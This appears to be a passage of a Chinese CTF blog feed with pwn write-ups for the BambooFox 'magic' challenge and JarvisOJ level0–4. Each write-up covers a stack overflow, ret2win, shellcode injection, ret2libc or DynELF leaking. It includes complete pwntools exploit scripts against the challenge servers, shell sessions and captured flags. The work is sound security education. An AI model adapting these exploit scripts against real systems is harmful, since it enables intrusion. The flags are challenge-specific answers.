id="三、pwn题"><a href="#三、pwn题" class="headerlink" title="三、pwn题"></a>三、pwn题</h3><h5 id="1-magic"><a href="#1-magic" class="headerlink" title="1.magic"></a>1.<a href="https://bamboofox.cs.nctu.edu.tw/courses/1/challenges/1" target="_blank" rel="noopener">magic</a></h5><p><a href="https://bamboofox.cs.nctu.edu.tw/uploads/challenge/attachments/1/magic" target="_blank" rel="noopener">题目下载</a></p><p>题目线索给出了两个关键函数源码<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">do_magic</span><span class="params">(<span class="keyword">char</span> *buf,<span class="keyword">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    srand(time(<span class="literal">NULL</span>));</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">        buf[i] ^= rand()%<span class="number">256</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">magic</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> magic_str[<span class="number">60</span>];</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%s"</span>, magic_str);</span><br><span class="line">    do_magic(magic_str, <span class="built_in">strlen</span>(magic_str));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%s"</span>, magic_str);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>通过在虚拟机下运行程序，得到如下结果：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">➜  magic ./magic </span><br><span class="line">Welcome to Magic system!</span><br><span class="line">Give me your name(a-z): aaaa</span><br><span class="line">Your name is aaaa.</span><br><span class="line">Give me something that you want to MAGIC: 1111111111111111</span><br><span class="line">�'��m��:�ǵ�j#</span><br></pre></td></tr></table></figure><p>IDA反编译结果如下：</p><ul><li><p>main</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    _BYTE v4[<span class="number">3</span>]; <span class="comment">// [esp+11h] [ebp-Fh]</span></span><br><span class="line">    <span class="keyword">int</span> i; <span class="comment">// [esp+1Ch] [ebp-4h]</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Welcome to Magic system!"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Give me your name(a-z): "</span>);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">10</span> &amp;&amp; read(<span class="number">0</span>, &amp;v4[i], <span class="number">1u</span>) &amp;&amp; v4[i] &gt; <span class="number">96</span> &amp;&amp; v4[i] ; ++i )</span><br><span class="line">      ;</span><br><span class="line">    v4[i] = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Your name is %s.\n"</span>, v4);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Give me something that you want to MAGIC: "</span>);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    magic();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>never_use</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">never_use</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> system(<span class="string">"sh -i"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><p>根据代码可以得出，magic的scanf()处存在栈溢出漏洞，而程序中有一个写好了的never_use()可以调用shell，因此思路在于利用栈溢出劫持eip到never_use()处。<br>为了具体实现，需要事先记下never_use()的地址。在IDA中查看：</p><p><img src="https://i.loli.net/2019/02/18/5c6a8a2a8ab42.png" alt="Please wait while loading image." title="addr"></p><p>这里应该是出题人留了个坑，scanf()在读取\x0D的时候会“吃掉”它，因此这里需要修改目标地址为0x08048613，<br>    target_addr = 0x08048613<br>有了目标地址，再回头来看利用。根据IDA中给出的大小</p><p><img src="https://i.loli.net/2019/02/18/5c6a8eb2c93ba.png" alt="Please wait while loading image." title="stack"></p><p>观察s，距离ebp是44h，即68，加上ebp自身的4字节大小，最后得出payload的格式应该为”[72]+target_addr”，而这里出题人还留了个坑，就是do_magic()，这个函数会在magic()返回之前，将用户的输入与随机数做异或运算，这样原本输入的目标地址会被打乱。为了解决这个问题，需要在payload的地址前插入一个\x00，\x00会使strlen()返回，因此在72个随机字符中只要插入一个\x00，后面的部分就不会被do_magic()改变，目标地址也就保存下来了，最终exp如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">target_addr = <span class="number">0x08048613</span></span><br><span class="line">payload = <span class="string">"a"</span> * <span class="number">71</span> + <span class="string">'\x00'</span> + p32(target_addr)</span><br><span class="line"><span class="keyword">print</span> <span class="string">'The payload is :'</span> + payload</span><br><span class="line"><span class="comment">#sh = process('./magic')</span></span><br><span class="line">sh = remote(<span class="string">'bamboofox.cs.nctu.edu.tw'</span>, <span class="number">10000</span>)</span><br><span class="line"><span class="keyword">print</span> sh.recvuntil(<span class="string">':'</span>)</span><br><span class="line">sh.sendline(<span class="string">'a'</span>)</span><br><span class="line"><span class="keyword">print</span> sh.recvuntil(<span class="string">':'</span>)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p><code>`</code></p>]]></content>
      
      
      <categories>
          
          <category> 学校 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JarvisOJ-pwn-0~4题解</title>
      <link href="/2019/04/22/JarvisOJ-pwn-0-4/"/>
      <url>/2019/04/22/JarvisOJ-pwn-0-4/</url>
      
        <content type="html"><![CDATA[<h2 id="level0"><a href="#level0" class="headerlink" title="level0"></a>level0</h2><blockquote><p>这题注意是x64的，开始做的时候把rbp当0x4h计算了…脑抽了</p></blockquote><p><code>main</code>函数反编译：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  write(<span class="number">1</span>, <span class="string">"Hello, World\n"</span>, <span class="number">0xD</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> vulnerable_function(<span class="number">1L</span>L, <span class="string">"Hello, World\n"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><code>vulnerable_function</code>函数反编译：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ssize_t</span> vulnerable_function()</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+0h] [rbp-80h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, &amp;buf, <span class="number">0x200</span>uLL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>很明显的栈溢出漏洞，buf距离 <code>rbp</code> <code>80h</code>，而<code>read</code>最多可以读<code>200h</code>。<br>同时在程序中还可以发现这个：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">⚡ root@ubuntu  /mnt/hgfs/ctf/pwn/jarvis  objdump -T level0</span><br><span class="line"></span><br><span class="line">level0:     file format elf64-x86-64</span><br><span class="line"></span><br><span class="line">DYNAMIC SYMBOL TABLE:</span><br><span class="line">0000000000000000      DF *UND*0000000000000000  GLIBC_2.2.5 write</span><br><span class="line">0000000000000000      DF *UND*0000000000000000  GLIBC_2.2.5 system</span><br><span class="line">0000000000000000      DF *UND*0000000000000000  GLIBC_2.2.5 <span class="built_in">read</span></span><br><span class="line">0000000000000000      DF *UND*0000000000000000  GLIBC_2.2.5 __libc_start_main</span><br><span class="line">0000000000000000  w   D  *UND*0000000000000000              __gmon_start__</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> ⚡ root@ubuntu  /mnt/hgfs/ctf/pwn/jarvis  objdump -t level0 | grep system</span><br><span class="line">0000000000000000       F *UND*0000000000000000              system@@GLIBC_2.2.5</span><br><span class="line">0000000000400596 g     F .text0000000000000010              callsystem</span><br></pre></td></tr></table></figure><p>可以看到<code>0x400596</code>处有一个<code>callsystem</code>函数，函数反编译如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">callsystem</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>因此构造溢出字符串，使得<code>vulnerable_function</code>返回地址覆盖为<code>callsystem</code>的地址<br>exp如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#sh = process('./level0')</span></span><br><span class="line">sh = remote(<span class="string">"pwn2.jarvisoj.com"</span>, <span class="number">9881</span>)</span><br><span class="line">addr = p64(<span class="number">0x400596</span>)</span><br><span class="line"><span class="keyword">print</span> addr</span><br><span class="line">payload = <span class="string">'a'</span> * <span class="number">0x88</span> + addr</span><br><span class="line"></span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure></p><p>执行效果:<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[+] Opening connection to pwn2.jarvisoj.com on port 9881: Done</span><br><span class="line">\x96\x05@\x00\x00\x00\x00\x00</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">Hello, World</span><br><span class="line">$ cat flag</span><br><span class="line">CTF&#123;713ca3944e92180e0ef03171981dcd41&#125;</span><br><span class="line">$</span><br></pre></td></tr></table></figure></p><h2 id="level1"><a href="#level1" class="headerlink" title="level1"></a>level1</h2><p><code>main</code>函数与level0一致，<code>vulnerable_function</code>:<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ssize_t</span> vulnerable_function()</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+0h] [ebp-88h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"What's this:%p?\n"</span>, &amp;buf);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, &amp;buf, <span class="number">0x100</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>相比level0，题中没有再给出一个可以直接利用的<code>system</code>函数，因此需要自己构造shellcode，并且劫持控制流返回到shellcode处，<code>vulnerable_function</code>会打印出buf的地址，且程序未开启NX保护，因此只需要将shellcode写入buf将<code>vulnerable_function</code>返回地址覆盖为buf中shellcode的位置（为了方便放在buf的开始部分）即可，exp如下：<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = remote(<span class="string">"pwn2.jarvisoj.com"</span>, <span class="number">9877</span>)</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">payload = shellcode.ljust((<span class="number">0x88</span>+<span class="number">4</span>),<span class="string">'A'</span>)</span><br><span class="line">a = sh.recvline()[<span class="number">14</span>:<span class="number">-2</span>]</span><br><span class="line">payload  += p32(int(a,base = <span class="number">16</span>))</span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure></p><p>运行结果：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[+] Opening connection to pwn2.jarvisoj.com on port 9877: Done</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">$ cat flag</span><br><span class="line">CTF&#123;82c2aa534a9dede9c3a0045d0fec8617&#125;</span><br><span class="line">$</span><br></pre></td></tr></table></figure></p><h2 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h2><p><code>vulnerable_function</code>：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ssize_t</span> vulnerable_function()</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+0h] [ebp-88h]</span></span><br><span class="line"></span><br><span class="line">  system(<span class="string">"echo Input:"</span>);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, &amp;buf, <span class="number">0x100</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>函数中出现了<code>system</code>函数，思路为控制<code>read</code>返回到<code>system</code>函数，并且伪造参数，执行<code>system(&quot;/bin/sh&quot;)</code>，在程序中可以找到这个字符串：<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">⚡ root@ubuntu  /ctf/pwn/jarvis  strings -a -t x ./level2 | grep bin</span><br><span class="line">  1024 /bin/sh</span><br></pre></td></tr></table></figure></p><p>exp如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = remote(<span class="string">"pwn2.jarvisoj.com"</span>,<span class="number">9878</span>)</span><br><span class="line">elf = ELF(<span class="string">'./level2'</span>)</span><br><span class="line">sh.recvline()</span><br><span class="line">sys = elf.symbols[<span class="string">'system'</span>]</span><br><span class="line">payload = <span class="string">'a'</span> * (<span class="number">0x88</span> + <span class="number">4</span>) + p32(sys) + p32(<span class="number">0xaaaaaaaa</span>) + p32(elf.search(<span class="string">'/bin/sh'</span>).next())</span><br><span class="line"></span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure></p><p>执行结果：<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[+] Opening connection to pwn2.jarvisoj.com on port 9878: Done</span><br><span class="line">[*] <span class="string">'/mnt/hgfs/ctf/pwn/jarvis/level2'</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">$ cat flag</span><br><span class="line">CTF&#123;1759d0cbd854c54ffa886cd9df3a3d52&#125;</span><br><span class="line">$</span><br></pre></td></tr></table></figure></p><h2 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h2><blockquote><p>不会写exp……</p></blockquote><p><code>vulunerable_function</code> :<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ssize_t</span> vulnerable_function()</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+0h] [ebp-88h]</span></span><br><span class="line"></span><br><span class="line">  write(<span class="number">1</span>, <span class="string">"Input:\n"</span>, <span class="number">7u</span>);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, &amp;buf, <span class="number">0x100</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>同样的溢出点，但是这次没有直接给出可利用的代码，题目提供了<code>libc-2.19.so</code>，因此思路是首先控制<code>read</code>返回到<code>write</code>，控制<code>write</code>调用的参数，使其打印出<code>read</code>的got地址对应的值（即<code>read</code>的绝对地址），并使其返回到<code>vulnerable_function</code>，通过<code>write</code>打印得到的<code>read</code>绝对地址，利用绝对地址和在libc中查询到的<code>read</code>的libc地址计算出偏移，从而计算出system的绝对地址，继而构造<code>system(&#39;/bin/sh&#39;)</code>并执行。</p><p>exp:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = remote(<span class="string">'pwn2.jarvisoj.com'</span>,<span class="number">9879</span>)</span><br><span class="line">elf = ELF(<span class="string">'./level3'</span>)</span><br><span class="line"></span><br><span class="line">write_plt = hex(elf.plt[<span class="string">'write'</span>])</span><br><span class="line">read_got = hex(elf.got[<span class="string">'read'</span>])</span><br><span class="line">vuln_addr = hex(elf.symbols[<span class="string">'vulnerable_function'</span>])</span><br><span class="line">args = p32(<span class="number">0x01</span>) + p32(int(read_got, <span class="number">16</span>)) + p32(<span class="number">0x04</span>)</span><br><span class="line"></span><br><span class="line">payload_leak = <span class="string">'A'</span> * (<span class="number">0x88</span> + <span class="number">4</span>) </span><br><span class="line">payload_leak += p32(int(write_plt, base = <span class="number">16</span>)) </span><br><span class="line">payload_leak += p32(int(vuln_addr, base = <span class="number">16</span>)) </span><br><span class="line">payload_leak += args</span><br><span class="line"></span><br><span class="line">sh.recvline()</span><br><span class="line">sh.sendline(payload_leak)</span><br><span class="line"></span><br><span class="line">re = sh.recv()[<span class="number">0</span>:<span class="number">4</span>]</span><br><span class="line"><span class="keyword">print</span> re</span><br><span class="line">read_addr = u32(re)</span><br><span class="line">read_libc = <span class="number">0x000dd3e0</span></span><br><span class="line">offset =  read_addr - read_libc</span><br><span class="line">system_libc = <span class="number">0x00040310</span></span><br><span class="line">exit_libc = <span class="number">0x00033260</span></span><br><span class="line">system_addr = offset + system_libc</span><br><span class="line">exit_addr = offset + exit_libc</span><br><span class="line">binsh_addr = offset + <span class="number">0x162d4c</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">'A'</span> * (<span class="number">0x88</span> + <span class="number">4</span>) + p32(system_addr) + p32(exit_addr) + p32(binsh_addr)</span><br><span class="line"><span class="keyword">print</span> <span class="string">'payload :'</span> + payload</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure></p><p>执行效果:<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">[+] Opening connection to pwn2.jarvisoj.com on port 9879: Done</span><br><span class="line">[*] <span class="string">'/mnt/hgfs/ctf/pwn/jarvis/level3/level3'</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">�ck�</span><br><span class="line">payload :AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x10\x93a�`�`�L�s�</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">$ cat flag</span><br><span class="line">CTF&#123;d85346df5770f56f69025bc3f5f1d3d0&#125;</span><br><span class="line">$</span><br></pre></td></tr></table></figure></p><h2 id="level4"><a href="#level4" class="headerlink" title="level4"></a>level4</h2><blockquote><p>同样不会写exp…</p></blockquote><p>思路与level3大致相同，不过这次没有给出libc，百度了wp才知道需要用到DynELF模块暴力跑出system的地址<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = remote(<span class="string">'pwn2.jarvisoj.com'</span>,<span class="string">'9880'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./level4'</span>)</span><br><span class="line"></span><br><span class="line">vuln_addr = <span class="number">0x0804844b</span></span><br><span class="line">write_plt = elf.symbols[<span class="string">'write'</span>]</span><br><span class="line">read_plt = elf.symbols[<span class="string">'read'</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#得到system地址后需要向可执行段写入/bin/sh，因为开启了NX保护，这里选择向bss段写入</span></span><br><span class="line">bss_addr = <span class="number">0x0804A024</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">(addr)</span>:</span></span><br><span class="line">    <span class="comment">#不断返回到vuln，每次溢出都调用write，伪造参数，打印地址，利用DynELF得到system绝对地址</span></span><br><span class="line">    payload_leak = <span class="string">'A'</span> * (<span class="number">0x88</span> + <span class="number">4</span>) + p32(write_plt) + p32(vuln_addr) + p32(<span class="number">0x1</span>) + p32(addr) + p32(<span class="number">0x4</span>)</span><br><span class="line">    sh.sendline(payload_leak)</span><br><span class="line">    leak = sh.recv(<span class="number">4</span>)</span><br><span class="line">    <span class="keyword">return</span> leak</span><br><span class="line"></span><br><span class="line">dyn = DynELF(leak, elf = ELF(<span class="string">"./level4"</span>))</span><br><span class="line">system_addr = dyn.lookup(<span class="string">'system'</span>, <span class="string">'libc'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#伪造read参数，溢出返回到read，并向目标地址（bss段）写入/bin/sh</span></span><br><span class="line">payload_write = <span class="string">'A'</span> * (<span class="number">0x88</span> + <span class="number">4</span>) + p32(read_plt) + p32(vuln_addr) + p32(<span class="number">0x0</span>) + p32(bss_addr) + p32(<span class="number">0x8</span>)</span><br><span class="line">sh.sendline(payload_write)</span><br><span class="line">sh.sendline(<span class="string">'/bin/sh'</span>) <span class="comment">#这步结束后，再次返回到vuln</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#调用system函数</span></span><br><span class="line">useless_addr = <span class="number">0x11111111</span></span><br><span class="line">payload = <span class="string">'A'</span> * (<span class="number">0x88</span> + <span class="number">4</span>) + p32(system_addr) + p32(useless_addr) + p32(bss_addr)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure></p><p>执行效果：<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">[+] Opening connection to pwn2.jarvisoj.com on port 9880: Done</span><br><span class="line">[*] <span class="string">'/mnt/hgfs/ctf/pwn/jarvis/level4'</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">[+] Loading from <span class="string">'/mnt/hgfs/ctf/pwn/jarvis/level4'</span>: 0xf77de930</span><br><span class="line">[+] Resolving <span class="string">'system'</span> <span class="keyword">in</span> <span class="string">'libc.so'</span>: 0xf77de930</span><br><span class="line">[!] No ELF provided.  Leaking is much faster <span class="keyword">if</span> you have a copy of the ELF being leaked.</span><br><span class="line">[*] Trying lookup based on Build ID: de799a85b2ebc2929eb4585f009d0c5e6211f2f8</span><br><span class="line">[*] Skipping unavialable libc de799a85b2ebc2929eb4585f009d0c5e6211f2f8</span><br><span class="line">[*] .gnu.hash/.<span class="built_in">hash</span>, .strtab and .symtab offsets</span><br><span class="line">[*] Found DT_GNU_HASH at 0xf77afdd8</span><br><span 